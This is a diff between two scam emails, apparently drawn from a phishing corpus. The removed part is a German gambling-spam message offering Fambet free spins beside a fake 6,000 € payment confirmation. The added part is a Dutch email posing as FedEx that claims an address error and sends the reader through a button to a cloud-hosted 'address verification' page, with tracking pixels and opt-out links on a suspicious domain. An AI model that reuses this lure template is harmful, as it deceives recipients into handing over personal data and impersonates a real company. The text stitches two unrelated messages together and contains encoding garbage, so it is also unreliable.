+ =?utf-8?B?MjZIclRVdy8zZHUzVm5sbzJuaXFFY0g0WGtzV1YrSlZ2S0ticTJWNmhaWlZM?=
+ =?utf-8?B?Ymh4K0pzL2ZpbGpDQ3J0UHpEUGpRbzhTZVdrNStvNkpQSUdPSzlsbDVjU0ht?=
+ =?utf-8?B?SWprcXlCMmNOMGpzYUEyTWZMbDVnSS9pVzEwRjR1cGVxaWdsQkR5V094TWZT?=
+ =?utf-8?B?dEJIOW9TYytmVnh0bnhaVjl1MHFuMzN4dUVKc2p4TzFJUTI2bTF4K0xDSVdM?=
+ =?utf-8?B?Zmx2TXFramVIMDNUYkxYdmw5eStVRWhWeXdoNDlxYUQ2MTl3aHhSeHVmYm9k?=
+ =?utf-8?B?VVVzR2JRRVNxdWw1T0NrOG1FQ3dMN2tFLzF0eFZtMG9xdythMzBueHRaVWVZ?=
+ =?utf-8?B?ZTRNdTlkQ3RadzYzdDNWYXpicXVIZjArRHdML2FwZnFFUGI3bzNHZS9VbFRX?=
+ =?utf-8?B?WHZIMCtCalE5MUo3MG4wNXAxYW01VW5KOGtZa2tGbWw2b2pwMVI2RExJZEVu?=
+ =?utf-8?B?SEhkd29Od0ZMaGJjWVo5MG9VS2RJZ1BERjIvMjk2a0JBTkRlWVlHUW90UlU5?=
+ =?utf-8?B?TFBqdG5yWHF5bTZXK293S1p1Z2RkN2RpODQzS0JNaWdTS0x6clh1bjRVT2Fa?=
+ =?utf-8?B?REtEd3p5czI3N1dOTzFhdnl6amxhNXozUUg2WTJ1WDJDZDZVYjc0YlVPb3Na?=
+ =?utf-8?B?ZjV1U1RxLy9JdFRJankxc2tFNWY0NUFpZjBpM0NzMU9FQXhtNUxDdGJqNjFq?=
+ =?utf-8?B?WGtSeFV5dGd2UXZraTJYRlc4NjU2ekU0WUlzYlpGRTJLaldCZ2NGS0xyemV0?=
+ =?utf-8?B?ZVVGalE3TjJYS3lHMkptWlZwL0hmTXZlYXkyQ0FaTFFENWFLVHU3dE1oWHZa?=
+ =?utf-8?B?NnJ1Z1FITXJmbWNUeUcxdlBqOWo5Uy9QQ2tCU2RhbklpYWxiTkdnWnRqaHU5?=
+ =?utf-8?B?TzluWU9aSzlTTTMxd3plZ05BSDQ5aG5Lcmp4dW9IYlVnM09GbFd2eHVBNVE5?=
+ =?utf-8?B?U1BpWm9ScTFyWjNsb0dRQzZtNGV5WVZVQ0dxUUxWYVFZeEJIV0t4VHZDS1kz?=
+ =?utf-8?B?RmczNTgwWFd0U2JJVzdlVVNhSVRFVGRwa2x4Nmg4UHU5UHM3WjBRNHo5TDFs?=
+ =?utf-8?B?SjUxY1I5S0d2R1JWMW1CMjFFT3hqNDVQUWdpSEVYbzBtZlEyK1ZqWWVoRlYz?=
+ =?utf-8?B?MkdkYmQ1Njdxb3hQTUZGUVNIQkp3WVBhNWdiNWtMdUt2NU5yQ2thWkdZbHhi?=
+ =?utf-8?B?ZHErcGR5TVNHVlEyY0l3ZTJidkJWN3dVQ2VjVEtxbmhCSFVEY3psMCtoeFJz?=
+ =?utf-8?B?U21Ub0hTSXdFOVBCamxhOFhNdTRxQkxFcWIveGhwRTVoNUFlU25rd21rMlNw?=
+ =?utf-8?B?VUlwSmN3SW5qeXhFdGJsL2IvRE9YMTVOMUcyRSsrdW5MbFZUa0hLTVJ0MnYr?=
+ =?utf-8?B?NVFkb2I5eGtvZ1MvNUdvOVM1UER6WXVnUWNsb0s0bDkwSitCRmtVaU1kOTFR?=
+ =?utf-8?B?bVlDT1cvS2cwZnR0YkZqSE5Qb1pKSzRxVlAzaDVscjNlaTdTQlppMEoyN1hm?=
+ =?utf-8?B?YTR1TldhblhLWUJTSWVUZEFDNFQxUHV4dHVaS0s3RDhsYk1NaDUwdGJsZ3Nx?=
+ =?utf-8?B?N2xFS0VIV0t2NUhmRUhTY0dIWmRFbXdRdlBtNTRoYzlTVFArL3RabGFUWlgy?=
+ =?utf-8?B?UGNMUGJ5SlF6SE1RNDdlS0JNbEZZeTJqYVN0eG1SM2xqSnhqekF5eFNvMjhX?=
+ =?utf-8?B?NUdBY3hTWnREbUFqU0c4b1ZJWC8wVGh1aW9ZOWZSYkQ3S1RQUkh5OVM2cGg3?=
+ =?utf-8?B?dGVES2tVYXcwVzkvYW45KzhxbS9tWVNUSFg1RXRmK0d1VTI5N2JLd1NyNXhL?=
+ =?utf-8?B?bjIzL3B2dE9SZjRoQ0MwOWJHTE5WSzBIR2p5SVdBRzJSVHhleHd0K3dOVjF1?=
+ =?utf-8?B?QkludEdUczg4Y05QSjZmR3VTMGEwSC8wVEdwaFZzaTJkUHA5ZkovbUtiSWZl?=
+ =?utf-8?B?aXFhdU43Z0lOVHdvZlhhV0NRMWZLN2NUdngvZXlPcGJ6aFRMeU40OGRwS1d4?=
+ =?utf-8?B?MmJpbUh5My9hWXkyTGF0U1NEZGJEckRKZGZYMDRMTDVHbXZsZHI2SUk4TDY1?=
+ =?utf-8?B?dmFiVHErYjk5R1c1NEFoZVBhMFFYc2dHSEdNSmJCTE14c0ppR2trNExPek5a?=
+ =?utf-8?B?bTgrUTZtSmF1dUlwTTdxT3NDYWl6VXJ2bUJhWXE4bEZFNGhQU01QNDliZTlL?=
+ =?utf-8?B?Y2E2d2xMenhpanp5NER1c1FsTW9lVFh5c3cxcXRCc0pBRXc3ZmFNOVh5V3Yw?=
+ =?utf-8?B?aktKV0dSaVc4MUhOb2VseDd3YzlUcnNOYUZ0c1pxSnBORVpLeElBcUFwRnhL?=
+ =?utf-8?B?cEtOWEU5cDlQZXZqSmhiV1UrdlBGY01tQWFTQmF1amd2Mjd5TFByeE1JZnRs?=
+ =?utf-8?B?NVFTV2lJNDJpSXJqcDQ5c3pwcjVjOFI1Y2xXM3p0R1ZtaWgwYzF4d0hQVm96?=
+ =?utf-8?B?TSt1SExTb1JhbUFiWWE4YUJ3MWEzcnNibk0yaHc0SkJJbFNXWWVSMnhWK3hv?=
+ =?utf-8?B?NHFIWjlrTUxOd2c0b25RWWpTbXdOSTVIakFiUjJsTXN6NzUwUUpmVEJaYWpr?=
+ =?utf-8?B?TUlOM09ydFBkd3VRZDh1bU5jRGs3T1pDNnIvaHlDeFI3U1kwVWFyMGFPOVBm?=
+ =?utf-8?B?bGk4azdqRnZ5aTVVdGRUZk9sSG04QnB0dzl1amdUbzRvamhsSWxrZWF2N0dH?=
+ =?utf-8?B?dXZwVE5sZyt2dENrMXQ5clI3K0NiQXFXQml1R0NnUVREMGdGdDJ3L25vb0JH?=
+ =?utf-8?B?L3dTK0lYRi9xWTI3WjZYay80NzI5M2hwTEcwS09lcjlDRFIxcmNoNXV6SUxQ?=
+ =?utf-8?B?cEdRM29ZNmIzdm5lRWR5Tkx1UTFsUWM0bUdyRDh1Q01KbU40VVhPcHppVGh0?=
+ =?utf-8?B?dVFmMWNnNGN6VDErR0NUMTBPc3dmc0Z2ZDRIRzlmOG5TOU5mRXowUVI3NS9i?=
+ =?utf-8?B?cE5kc2hPZWxrc3FJcG5iNDQ0aGxDdzdxbVlpdU1ibVJPZkIwNXBIZVlBPT0=?=
 MIME-Version: 1.0
 
---00000000000054dcbd064c3cb4e1
-Content-Type: text/plain; charset="UTF-8"; format=flowed; delsp=yes
-Content-Transfer-Encoding: base64
+<!DOCTYPE html><html lang="nl"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-WmFobHVuZ3NiZXN0w6R0aWd1bmcNCg0KDQrwn46BIDMwMCBHUkFUSVMtRlJFSVNQSUVMRSBCRUkg
-REVSIFJFR0lTVFJJRVJVTkcNCldpbGxrb21tZW4gYmVpIPCflK4gRmFtYmV0IPCflK4hDQoNCkVy
-c3RlbGxlbiBTaWUgZWluIEtvbnRvIGJlaSBGYW1iZXQgdW5kIGVyaGFsdGVuIFNpZSAzMDAgRnJl
-aXNwaWVsZSDigJMgZ2FueiAgDQpvaG5lIEVpbnphaGx1bmchDQoNCg0KTUVJTkVOIEJPTlVTIEFO
-Rk9SREVSTg0KDQoNCklocmUgSW5mb3JtYXRpb25lbjoNCg0KWmFobHVuZ3NiZXN0w6R0aWd1bmc6
-IDYuMDAwIOKCrCBCRVpBSExUIMOcYmVycHLDvGZlbioNCg0KDQpBYm1lbGRlbg0K
---00000000000054dcbd064c3cb4e1
-Content-Type: text/html; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
 
-<!DOCTYPE html><html lang=3D"de"><head>
-<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8">
-<title>Zahlungsbest=C3=A4tigung =F0=9F=8E=89</title>
+
+    <title>FedEx Kennisgeving</title>
+
+
+
+    <style>
+
+
+
+        body {
+
+
+
+            font-family: Arial, sans-serif;
+
+
+
+            background-color: #f9f9f9;
+
+
+
+            color: #333;
+
+
+
+            margin: 0;
+
+
+
+            padding: 0;
+
+
+
+        }
+
+
+
+
+
+
+
+        .container {
+
+
+
+            max-width: 600px;
+
+
+
+            margin: 20px auto;
+
+
+
+            background-color: #ffffff;
+
+
+
+            padding: 20px;
+
+
+
+            border: 1px solid #ddd;
+
+
+
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+
+
+
+        }
+
+
+
+
+
+
+
+        .header {
+
+
+
+            text-align: center;
+
+
+
+            margin-bottom: 20px;
+
+
+
+        }
+
+
+
+
+
+
+
+        .header img {
+
+
+
+            max-width: 150px;
+
+
+
+        }
+
+
+
+
+
+
+
+        .content {
+
+
+
+            font-size: 14px;
+
+
+
+            line-height: 1.6;
+
+
+
+            color: #333;
+
+
+
+            text-align: center;
+
+
+
+        }
+
+
+
+
+
+
+
+        .content h1 {
+
+
+
+            color: #4d148c;
+
+
+
+            font-size: 24px;
+
+
+
+            margin: 0;
+
+
+
+            font-weight: normal;
+
+
+
+        }
+
+
+
+
+
+
+
+        .button {
+
+
+
+            display: inline-block;
+
+
+
+            margin-top: 20px;
+
+
+
+            padding: 10px 20px;
+
+
+
+            background-color: #4d148c;
+
+
+
+            color: #fff;
+
+
+
+            text-decoration: none;
+
+
+
+            border-radius: 4px;
+
+
+
+            font-size: 14px;
+
+
+
+        }
+
+
+
+
+
+
+
+        .footer {
+
+
+
+            margin-top: 30px;
+
+
+
+            font-size: 10px;
+
+
+
+            color: #666;
+
+
+
+            text-align: center;
+
+
+
+        }
+
+
+
+
+
+
+
+        .unsubscribe {
+
+
+
+            margin-top: 20px;
+
+
+
+            font-size: 10px;
+
+
+
+            color: #666;
+
+
+
+            text-align: center;
+
+
+
+        }
+
+
+
+
+
+
+
+        .unsubscribe a {
+
+
+
+            color: #666;
+
+
+
+            text-decoration: none;
+
+
+
+        }
+
+
+
+    </style>
+
+
+
 </head>
-<body style=3D"margin:0; padding:0; font-family: Arial, sans-serif; backgro=
-und-color:#121212; color:#ffffff;">
-<a href=3D"https://worldwidesupp.com/4mgxjp46824RStWW973fRDK0ODY0UJyw0bFJp4=
-" style=3D"text-decoration:none; color:inherit; display:block;">
-<div style=3D"max-width:600px; margin:0 auto; background:#1e1e1e; border-ra=
-dius:8px; overflow:hidden;">
- =20
-  <!-- HEADER -->
-  <div style=3D"background:#41F299; padding:20px; text-align:center; color:=
-#121212; font-size:28px; font-weight:bold;">
-    Zahlungsbest=C3=A4tigung
-  </div>
 
-  <!-- MAIN CONTENT -->
-  <div style=3D"padding:25px; font-size:15px; line-height:22px;">
-    <p><strong></strong></p>
-<center><img alt=3D"" src=3D"https://imgprom.com/wp-content/uploads/FamBet_=
-logo.png" border=3D"0" style=3D"display: inline-block !important; width: 18=
-0px; font-size: 0; line-height: 0; -ms-interpolation-mode: bicubic; max-wid=
-th: 100%; border: none;"><center><img alt=3D"" src=3D"//imgprom.com/wp-cont=
-ent/uploads/FamBet_logo.png" border=3D"0" style=3D"display: inline-block !i=
-mportant; width: 180px; font-size: 0; line-height: 0; -ms-interpolation-mod=
-e: bicubic; max-width: 100%; border: none;">
-    <p>
-      =F0=9F=8E=81 <b>300 GRATIS-FREISPIELE BEI DER REGISTRIERUNG</b><br>
-      Willkommen bei <b>=F0=9F=94=AE Fambet =F0=9F=94=AE</b>!
-    </p>
-    <p>
-      Erstellen Sie ein Konto bei Fambet und erhalten Sie <b>300 Freispiele=
-</b> =E2=80=93 ganz ohne Einzahlung!
-    </p>
-   =20
-    <!-- CTA BUTTON -->
-    <div style=3D"text-align:center; margin:30px 0;">
-      <div style=3D"background:#ff00ff; color:#121212; text-decoration:none=
-; padding:15px 25px;=20
-         font-weight:bold; border-radius:6px; display:inline-block; font-si=
-ze:16px;">
-        MEINEN BONUS ANFORDERN
-      </div>
+
+
+
+
+
+
+<body>
+
+
+
+    <div class="container">
+
+
+
+        <div class="header">
+
+
+
+            <h1 style="color:#4d148c; font-size: 40px;">Fed<span style="color:#ff6600;">Ex</span></h1>
+
+
+
+        </div>
+
+
+
+        <div class="content">
+
+
+
+            <div style="text-align: start;">
+
+
+
+                <p>Een pakket geadresseerd aan u is net aangekomen bij ons lokale distributiecentrum.</p>
+
+
+
+                <p>Er was echter een adresfout door logistieke verwerking aan onze kant.</p>
+
+
+
+                <p>Wij verzoeken u vriendelijk om ons adresysteem bij te werken met uw adres, zodat we uw pakket kunnen bezorgen.</p>
+
+
+
+            </div>
+
+
+
+            <a href="https://storage.googleapis.com/newera1/aaaaaaafedex.html" class="button">Adresverificatiesysteem</a>
+
+
+
+            <div style="text-align: start;">
+
+
+
+                <p style="margin-top: 20px;">We hopen uw pakket vÃ&#131;Â³Ã&#131;Â³r het einde van de werkdag te bezorgen.</p>
+
+
+
+                <p>Met vriendelijke groet,<br>Manager Pakket Distributie</p>
+
+
+
+            </div>
+
+
+
+        </div>
+
+
+
+        <div class="footer">
+
+
+
+            <p>Ã&#130;Â©2024 FedEx.</p>
+
+
+
+            <p>1003079-3-6-NL-EN-30234291</p>
+
+
+
+        </div>
+
+
+
+        <div class="unsubscribe">
+
+
+
+            <p>Als u deze e-mails niet meer wilt ontvangen, kunt u zich <a href="#">afmelden</a> op elk moment.</p>
+
+
+
+        </div>
+
+
+
     </div>
 
-    <!-- ACCOUNT INFO -->
-    <div style=3D"background:#2a2a2a; padding:20px; border-radius:6px;">
-      <h3 style=3D"color:#ff00ff; margin-top:0; text-transform:uppercase;">=
-Ihre Informationen:</h3>
-      =20
-      <p><strong>Zahlungsbest=C3=A4tigung:</strong> 6.000 =E2=82=AC BEZAHLT=
- <span style=3D"color:#41F299; text-decoration:underline;">=C3=9Cberpr=C3=
-=BCfen*</span></p>
-      <img src=3D"https://imgprom.com/wp-content/uploads/FamBet.jpg" width=
-=3D"100%">
-      <img src=3D"//imgprom.com/wp-content/uploads/FamBet.jpg" width=3D"100=
-%">
-    </div>
-  </div>
- =20
-  <!-- FOOTER -->
-  <div style=3D"text-align:center; font-size:11px; color:#bbbbbb; padding:1=
-5px;">
-  =20
-  </div>
-</div>
-</a>
-<br><br><br><br><br>
-<center>
-<span style=3D"font-size:10px;">
-<a href=3D"https://worldwidesupp.com/6jLwuF46824ZBWuK973Ixin0WPj0TRjH0KFRm4=
-" style=3D"color:grey;">
-Abmelden
-</a>
-</span>
-</center>
+
 
 </body>
-</html>
-                                       <img src=3D"http://social-trans.de/o=
-pen/P2Q9MTI2JmVpPTAwMSZpZj04JmxpPTAwJnR5PTE=3D/phishing@pot" wid=
-th=3D"1" height=3D"1">=
 
---00000000000054dcbd064c3cb4e1--
+
+
+
+
+
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+     </tr>
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+    <table align="center" width="100%" style="max-width:700px;">
+
+
+
+
+
+
+
+                        <tr>
+
+
+
+
+
+
+
+                            <td align="center" width="100%" style="font-family:Helvetica, Arial, sans-serif; font-size:10px; color:#202020; line-height:15px; padding-top:10px;">
+
+
+
+
+
+
+
+                                Om deze te stoppen alstublieft <a href="https://hnerta.dondomatos.online/opt-out/t/6WrzSv0VeIN3ekqeukwdby0GVEWWOLHNBTNBGY0NXMR353959e0" style="color:#202020;">klik hier</a> of schrijf naar:
+
+
+
+
+
+
+
+                                <br> Mozartstraat 44e
+
+
+
+
+
+
+
+                                <br> Groenlo, 7141 CP
+
+
+
+
+
+
+
+                            </td>
+
+
+
+
+
+
+
+                        </tr>
+
+
+
+
+
+
+
+                    </table>
+
+
+
+
+
+
+
+    </center>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+ <img src="https://hnerta.dondomatos.online/track/3FfFOW0wQeJ2gototrweuj0PFXXDNBSMBZKFYH0VBTR1943x0">
+
+
+
+
+
+
+
+
